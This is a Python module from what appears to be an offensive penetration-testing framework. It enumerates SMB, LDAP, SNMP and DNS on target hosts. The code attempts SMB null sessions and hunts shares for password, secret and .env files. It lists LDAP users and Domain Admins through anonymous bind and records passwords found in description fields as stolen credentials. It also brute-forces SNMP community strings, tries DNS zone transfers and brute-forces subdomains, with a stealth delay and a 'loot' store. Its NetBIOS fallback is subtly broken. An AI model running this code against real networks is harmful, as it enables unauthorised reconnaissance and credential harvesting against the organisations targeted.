"""SMB, LDAP, DNS, SNMP enumeration -- extract users, shares, records."""

from __future__ import annotations

from typing import Any, Dict, List

from aegis.models import AttackResult, Credential, EngagementContext, OpenPort
from aegis.logger import log
from aegis.modules.base import BaseModule
from aegis.utils.network import sleep_if_stealth
from aegis.data.ports import SNMP_COMMUNITY_STRINGS, SNMP_OIDS, WORDLIST_SUBDOMAINS

try:
    import impacket  # noqa: F401
    from impacket import nmb
    from impacket.smbconnection import SMBConnection
    IMPACKET = True
except ImportError:
    IMPACKET = False

try:
    import ldap3  # noqa: F401
    from ldap3 import Server as LDAPServer, Connection as LDAPConn, ALL, ANONYMOUS
    LDAP3 = True
except ImportError:
    LDAP3 = False

try:
    import dns.resolver
    import dns.zone
    import dns.query
    DNSPYTHON = True
except ImportError:
    DNSPYTHON = False

try:
    from pysnmp.hlapi import (getCmd, nextCmd, SnmpEngine, CommunityData,
                               UdpTransportTarget, ContextData, ObjectType, ObjectIdentity)
    PYSNMP = True
except ImportError:
    PYSNMP = False


class EnumModule(BaseModule):
    """SMB, LDAP, DNS, SNMP enumeration -- extract users, shares, records."""

    name = "enum"

    def run(self, ctx: EngagementContext, **kwargs: object) -> List[AttackResult]:
        domain: str = str(kwargs.get("domain", ""))
        results: List[AttackResult] = []
        for op in ctx.open_ports:
            if op.port in (139, 445):
                results.extend(self._smb_enum(ctx, op, domain))
            elif op.port in (389, 636, 3268, 3269):
                results.extend(self._ldap_enum(ctx, op, domain))
            elif op.port == 161:
                results.extend(self._snmp_enum(ctx, op))
            elif op.port == 53:
                results.extend(self._dns_enum(ctx, op, domain))
        if not ctx.open_ports:
            # Run against specified targets directly
            for target in ctx.targets:
                results.extend(self._smb_enum_direct(ctx, target, domain))
        return results

    # ------------------------------------------------------------------
    # SMB
    # ------------------------------------------------------------------

    def _smb_enum(self, ctx: EngagementContext, op: OpenPort, domain: str) -> List[AttackResult]:
        if not IMPACKET:
            return [AttackResult("enum", "smb", "PARTIAL",
                                 host=op.host, port=op.port,
                                 notes="Install impacket for SMB enumeration")]
        return self._smb_enum_direct(ctx, op.host, domain, port=op.port)

    def _smb_enum_direct(self, ctx: EngagementContext, host: str,
                          domain: str, port: int = 445) -> List[AttackResult]:
        if not IMPACKET:
            # Fallback: raw NetBIOS name query
            try:
                nb = nmb.NetBIOS()
                names = nb.queryIPForName(host, timeout=ctx.timeout)
                return [AttackResult("enum", "smb_netbios", "INFO", host=host,
                                     data={"netbios_names": names},
                                     notes=f"NetBIOS names: {names}")]
            except Exception:
                return []

        results: List[AttackResult] = []
        try:
            conn = SMBConnection(host, host, sess_port=port,
                                 timeout=int(ctx.timeout))
            # Try null session / anonymous
            try:
                conn.login("", "", "")
                null_session = True
            except Exception:
                null_session = False

            if null_session:
                log(f"[Enum/SMB] Null session allowed on {host}:{port}!", "CRIT")
                try:
                    shares = conn.listShares()
                    share_list = [{"name": s["shi1_netname"][:-1],
                                   "type": int(s["shi1_type"]),
                                   "remark": s["shi1_remark"]} for s in shares]
                    log(f"[Enum/SMB] Shares: {[s['name'] for s in share_list]}", "OK")
                    # Try to list readable shares
                    readable = []
                    for share in share_list:
                        try:
                            files = conn.listPath(share["name"], "\\")
                            readable.append(share["name"])
                            # Hunt for sensitive files
                            for f in files:
                                fname = f.get_longname()
                                if any(kw in fname.lower() for kw in
                                       ["password", "cred", "secret", "config", "backup", ".env"]):
                                    log(f"[Enum/SMB] Sensitive file: \\\\{host}\\{share['name']}\\{fname}", "CRIT")
                        except Exception:
                            pass
                    ctx.loot.setdefault("smb", []).append({
                        "host": host, "null_session": True,
                        "shares": share_list, "readable": readable,
                    })
                    results.append(AttackResult(
                        "enum", "smb_null_session", "SUCCESS",
                        host=host, port=port, severity="CRITICAL",
                        data={"shares": share_list, "readable": readable},
                        notes=f"SMB null session on {host} — {len(readable)} readable shares",
                    ))
                except Exception as e:
                    results.append(AttackResult("enum", "smb_enum", "PARTIAL", host=host, notes=str(e)))

            # OS / SMB version detection
            try:
                server_info = {
                    "hostname": conn.getServerName(),
                    "domain":   conn.getServerDomain(),
                    "os":       conn.getServerOS(),
                    "signing":  conn.isSigningRequired(),
                }
                log(f"[Enum/SMB] {host}: {server_info['os']} | Signing={server_info['signing']}", "INFO")
                if not server_info["signing"]:
                    results.append(AttackResult(
                        "enum", "smb_signing_disabled", "SUCCESS",
                        host=host, port=port, severity="HIGH",
                        data=server_info,
                        notes=f"SMB signing NOT required on {host} — relay attack possible",
                    ))
                else:
                    results.append(AttackResult(
                        "enum", "smb_info", "INFO", host=host, data=server_info,
                        notes=f"OS: {server_info['os']} | Domain: {server_info['domain']}",
                    ))
            except Exception:
                pass
            conn.close()
        except Exception as exc:
            results.append(AttackResult("enum", "smb_connect", "FAILED", host=host, notes=str(exc)))
        return results

    # ------------------------------------------------------------------
    # LDAP
    # ------------------------------------------------------------------

    def _ldap_enum(self, ctx: EngagementContext, op: OpenPort, domain: str) -> List[AttackResult]:
        if not LDAP3:
            return [AttackResult("enum", "ldap", "PARTIAL", host=op.host,
                                 notes="Install ldap3 for LDAP enumeration")]
        results: List[AttackResult] = []
        use_ssl = op.port in (636, 3269)
        try:
            server = LDAPServer(op.host, port=op.port, use_ssl=use_ssl, get_info=ALL,
                                connect_timeout=ctx.timeout)
            # 1. Anonymous bind (info leak)
            conn = LDAPConn(server, authentication=ANONYMOUS)
            conn.bind()
            if server.info:
                naming_contexts = getattr(server.info, "naming_contexts", [])
                base_dn = str(naming_contexts[0]) if naming_contexts else ""
                domain_from_ldap = domain or (base_dn.replace(",", ".").replace("DC=", "").replace("dc=", ""))
                log(f"[Enum/LDAP] Base DN: {base_dn} | Domain: {domain_from_ldap}", "INFO")

                # 2. Enumerate users (common attributes)
                user_filter = "(&(objectClass=user)(objectCategory=person))"
                conn.search(base_dn, user_filter,
                            attributes=["sAMAccountName", "memberOf", "userAccountControl",
                                        "lastLogon", "description", "mail", "cn"])
                users = []
                for entry in conn.entries[:100]:
                    uac = getattr(entry, "userAccountControl", None)
                    disabled = bool(int(str(uac)) & 2) if uac and str(uac).isdigit() else False
                    users.append({
                        "username": str(getattr(entry, "sAMAccountName", "")),
                        "cn":       str(getattr(entry, "cn", "")),
                        "email":    str(getattr(entry, "mail", "")),
                        "disabled": disabled,
                        "desc":     str(getattr(entry, "description", ""))[:100],
                    })
                # Check descriptions for passwords (common misconfiguration)
                users_with_pass = [u for u in users if any(
                    kw in u["desc"].lower() for kw in ["pass", "pwd", "cred", "temp", "initial"]
                )]
                if users_with_pass:
                    log(f"[Enum/LDAP] Passwords found in descriptions! {[u['username'] for u in users_with_pass]}", "CRIT")
                    for u in users_with_pass:
                        ctx.credentials.append(Credential(
                            service="ldap_description", host=op.host, port=op.port,
                            username=u["username"], password=u["desc"],
                            notes=f"Password in LDAP description field for {u['username']}"
                        ))

                # 3. Enumerate groups
                group_filter = "(objectClass=group)"
                conn.search(base_dn, group_filter, attributes=["cn", "member", "description"])
                groups = []
                for entry in conn.entries[:50]:
                    members = [str(m) for m in getattr(entry, "member", [])]
                    groups.append({"name": str(getattr(entry, "cn", "")),
                                   "member_count": len(members)})

                # 4. Find privileged users (Domain Admins)
                da_filter = "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users," + base_dn + "))"
                conn.search(base_dn, da_filter, attributes=["sAMAccountName"])
                domain_admins = [str(e.sAMAccountName) for e in conn.entries]

                ctx.loot.setdefault("ldap", {})[op.host] = {
                    "base_dn": base_dn, "user_count": len(users),
                    "domain_admins": domain_admins, "users_with_passwords_in_desc": users_with_pass,
                    "users": users[:20], "groups": groups[:10],
                }
                results.append(AttackResult(
                    "enum", "ldap_anonymous", "SUCCESS",
                    host=op.host, port=op.port,
                    severity="HIGH" if users else "MEDIUM",
                    data={"users": len(users), "domain_admins": domain_admins,
                          "creds_in_desc": len(users_with_pass)},
                    notes=f"Anonymous LDAP bind: {len(users)} users, DAs: {domain_admins}",
                ))
            conn.unbind()
        except Exception as exc:
            results.append(AttackResult("enum", "ldap_connect", "FAILED",
                                        host=op.host, notes=str(exc)))
        return results

    # ------------------------------------------------------------------
    # SNMP
    # ------------------------------------------------------------------

    def _snmp_enum(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not PYSNMP:
            return [AttackResult("enum", "snmp", "PARTIAL", host=op.host,
                                 notes="Install pysnmp for SNMP enumeration")]
        results: List[AttackResult] = []
        found_community = None

        for community in SNMP_COMMUNITY_STRINGS:
            try:
                error_indication, error_status, _, var_binds = next(
                    getCmd(SnmpEngine(),
                           CommunityData(community, mpModel=1),
                           UdpTransportTarget((op.host, 161), timeout=ctx.timeout, retries=1),
                           ContextData(),
                           ObjectType(ObjectIdentity("1.3.6.1.2.1.1.1.0")))
                )
                if not error_indication and not error_status:
                    found_community = community
                    sys_descr = str(var_binds[0][1])
                    log(f"[Enum/SNMP] Community '{community}' works on {op.host}! SysDescr: {sys_descr[:80]}", "CRIT")
                    break
            except Exception:
                pass

        if found_community:
            snmp_data: Dict[str, Any] = {"community": found_community}
            for oid_name, oid_str in SNMP_OIDS.items():
                try:
                    for error_ind, error_stat, _, vb in nextCmd(
                        SnmpEngine(),
                        CommunityData(found_community, mpModel=1),
                        UdpTransportTarget((op.host, 161), timeout=ctx.timeout, retries=1),
                        ContextData(),
                        ObjectType(ObjectIdentity(oid_str)),
                        lexicographicMode=False,
                        maxRows=20,
                    ):
                        if error_ind or error_stat:
                            break
                        for v in vb:
                            snmp_data.setdefault(oid_name, []).append(str(v[1]))
                except Exception:
                    pass
            ctx.loot.setdefault("snmp", {})[op.host] = snmp_data
            results.append(AttackResult(
                "enum", "snmp_community", "SUCCESS",
                host=op.host, port=161, severity="HIGH",
                data=snmp_data,
                notes=f"SNMP community '{found_community}' found — full device info accessible",
            ))
        else:
            results.append(AttackResult("enum", "snmp_community", "FAILED",
                                        host=op.host, notes="No SNMP community string worked"))
        return results

    # ------------------------------------------------------------------
    # DNS
    # ------------------------------------------------------------------

    def _dns_enum(self, ctx: EngagementContext, op: OpenPort, domain: str) -> List[AttackResult]:
        if not DNSPYTHON or not domain:
            return [AttackResult("enum", "dns", "PARTIAL", host=op.host,
                                 notes="Provide --domain and install dnspython for DNS enumeration")]
        results: List[AttackResult] = []

        # 1. Zone transfer attempt
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(op.host, domain, timeout=ctx.timeout))
            records = []
            for name in zone:
                for rdataset in zone[name]:
                    records.append({"name": str(name), "type": rdataset.rdtype,
                                    "data": [str(r) for r in rdataset]})
            log(f"[Enum/DNS] ZONE TRANSFER SUCCESS! {len(records)} records from {op.host}", "CRIT")
            ctx.loot.setdefault("dns", {})[op.host] = {"zone_transfer": records}
            results.append(AttackResult(
                "enum", "dns_zone_transfer", "SUCCESS",
                host=op.host, port=53, severity="CRITICAL",
                data={"record_count": len(records), "records": records[:20]},
                notes=f"Zone transfer from {op.host} for '{domain}' succeeded — {len(records)} records exposed",
            ))
        except Exception:
            results.append(AttackResult("enum", "dns_zone_transfer", "FAILED",
                                        host=op.host, notes="Zone transfer refused"))

        # 2. Subdomain brute-force
        found_subs: List[Dict[str, str]] = []
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [op.host]
        resolver.timeout = ctx.timeout
        for sub in WORDLIST_SUBDOMAINS:
            fqdn = f"{sub}.{domain}"
            for qtype in ("A", "CNAME"):
                try:
                    ans = resolver.resolve(fqdn, qtype)
                    ips = [str(r) for r in ans]
                    found_subs.append({"subdomain": fqdn, "type": qtype, "records": ips})
                    log(f"[Enum/DNS] Found: {fqdn} → {ips}", "OK")
                    break
                except Exception:
                    pass
            sleep_if_stealth(ctx)

        if found_subs:
            ctx.loot.setdefault("dns", {}).setdefault(op.host, {})["subdomains"] = found_subs
            results.append(AttackResult(
                "enum", "dns_subdomain_enum", "SUCCESS",
                host=op.host, severity="MEDIUM",
                data={"found": len(found_subs), "subdomains": found_subs},
                notes=f"Discovered {len(found_subs)} subdomains for {domain}",
            ))
        return results
